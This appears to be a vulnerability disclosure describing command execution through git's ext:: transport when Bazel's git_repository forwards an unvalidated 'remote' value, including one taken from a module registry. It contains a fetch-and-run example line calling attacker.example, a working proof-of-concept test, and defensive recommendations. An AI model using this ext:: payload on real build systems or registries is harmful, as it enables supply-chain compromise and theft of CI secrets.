### Title
Command execution via unsanitized `remote` field in `git_repository`/registry-driven git fetch - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
For `git_repository`/`new_git_repository` (and Bzlmod modules whose registry `source.json` specifies `"type": "git_repository"`), the `remote` attribute is forwarded verbatim into `git remote add origin <remote>` and subsequently `git fetch origin`, with no restriction on git's URL/transport schemes and no cryptographic binding (no `sha256`/`integrity` field covers the `remote` string). Git supports the `ext::<command>` transport helper, which executes an arbitrary shell command supplied inside the URL. Consequently, any untrusted party who controls the `remote` value used by a `git_repository` invocation — most notably a Bazel Module Registry (including a compromised/malicious mirror, as explicitly listed as in-scope in the "hostile origin server, mirror or registry" case) serving a module's `source.json` — can achieve arbitrary command execution on the machine performing `bazel fetch`/`bazel build`.

### Finding Description
`git_repository`'s `remote` attribute is a plain string with no validation on scheme: [1](#0-0) 

It flows into `git_repo` construction and then into `add_origin`, which runs `git remote add origin <remote>` via argv (not a shell string, but this doesn't matter — the injection is a *git* feature, not a shell-quoting bug): [2](#0-1) [3](#0-2) [4](#0-3) 

`fetch()` then runs `git fetch origin -- <fetch_ref>`, which will invoke the transport for whatever URL scheme was registered as `origin`: [5](#0-4) 

Nowhere in `git_worker.bzl` is `GIT_ALLOW_PROTOCOL`, `-c protocol.ext.allow=never`, or any protocol allowlist set (the only protocol config found is `protocol.file.allow=always`, used for submodules) — confirmed by searching the file and finding no `protocol.ext.allow`/`GIT_ALLOW_PROTOCOL` references anywhere in `.bzl` code: [6](#0-5) 

Git's built-in `ext::` remote helper transport executes an arbitrary command embedded in the URL (e.g. `ext::sh -c "curl attacker.example|sh"`) whenever git operates on that remote — this happens on `git remote add` and more critically the subsequent `git fetch`, entirely independent of any Starlark quoting logic in `utils.bzl`'s `patch()`. This is a genuine command-execution primitive supplied by the transport layer, not a shell-escaping defect that Bazel could fix by quoting strings.

The `remote` field for `git_repository`-typed modules is explicitly part of the registry `source.json` schema and is documented as being "directly forwarded to the underlying `git_repository` repo rule": [7](#0-6) 

Unlike the `archive` source type, where the `url` is bound to a `sha256`/`integrity` checksum verified after download, the `git_repository` source type has **no** integrity binding on the `remote` string itself — only `commit`/`tag`/`shallow_since` pin *content*, but the transport/URL scheme used to reach that content is fully attacker-controlled and unauthenticated. A hostile or compromised registry (or a compromised mirror serving `source.json`, since Bazel also tries mirror-provided URLs) can set `remote` to an `ext::` URL, breaking the implicit invariant that the registry only supplies *data* (an archive/commit to fetch), never *code to execute on the build host*.

### Impact Explanation
Any build that resolves a Bzlmod dependency backed by a `git_repository` source pointing at a hostile/compromised registry (or any project directly consuming an externally-supplied `remote` value, e.g. through a shared/templated dependency list) will execute arbitrary attacker-chosen commands on the local build machine — or on a remote build host if the fetch happens there — during `bazel fetch`/`bazel build`, with the privileges of the Bazel user. This exposes build-host secrets, CI credentials, and any other repository/project accessible to that host, matching the CVSS 9.6 severity profile of the analog Dokploy issue (full command execution from a data field that should only ever specify a repository location).

### Likelihood Explanation
Exploitation requires only that the victim's Bazel build consults a registry (or mirror) under attacker control for at least one dependency of type `git_repository` — no access to the victim's machine, credentials, or root `MODULE.bazel`/`BUILD` files is needed. Because Bzlmod's default `--registry` list can include third-party/community registries, and registries can be added or overridden per-project, this is a realistic supply-chain vector: a malicious registry entry (or malicious mirror seen before the legitimate registry, or a hijacked/typosquatted registry) is sufficient. No user interaction beyond a normal `bazel build`/`bazel fetch` is required, and detection is difficult because the payload is embedded innocuously in a URL-shaped string.

### Recommendation
- Reject/validate the `remote` attribute in `git.bzl`/`git_worker.bzl` (and any registry-forwarded `remote`) against an allowlist of safe schemes (`http://`, `https://`, `git://`, `ssh://`, `file://` under controlled conditions), explicitly disallowing `ext::`, `fd::`, and other command-executing git transports.
- Invoke git with `-c protocol.ext.allow=never -c protocol.fd.allow=never` (or set `GIT_ALLOW_PROTOCOL` to an explicit allowlist) for every git subprocess spawned by `git_worker.bzl`, not just `protocol.file.allow` for submodules.
- Apply the same validation/allowlisting to values consumed from registry `source.json` before they are forwarded into `git_repository`'s `remote` attribute, since registries are untrusted input.

### Proof of Concept
A `src/test/shell/bazel/external_patching_test.sh`-style integration test (or a new `git_repository_test.sh`) reproduces the issue:

```sh
function test_git_repository_ext_protocol_command_execution() {
  cat > MODULE.bazel <<'EOF'
git_repository = use_repo_rule("@bazel_tools//tools/build_defs/repo:git.bzl", "git_repository")
git_repository(
  name = "pwn",
  # Simulates a malicious registry/mirror-supplied "remote" field.
  remote = "ext::sh -c 'touch /tmp/PWNED >&2; exit 1'",
  commit = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
)
EOF
  touch BUILD

  bazel fetch @pwn//:all >& $TEST_log
  # Even though the fetch ultimately "fails" (no such commit), the ext::
  # helper command has already run.
  [ -f /tmp/PWNED ] || fail "expected command execution via ext:: remote"
}
```

Running this against the current `git_worker.bzl`/`git.bzl` demonstrates that `/tmp/PWNED` is created purely as a side effect of `git remote add origin ext::...` / `git fetch origin`, confirming arbitrary command execution originating from a data-only `remote` field with no protocol restriction in place.
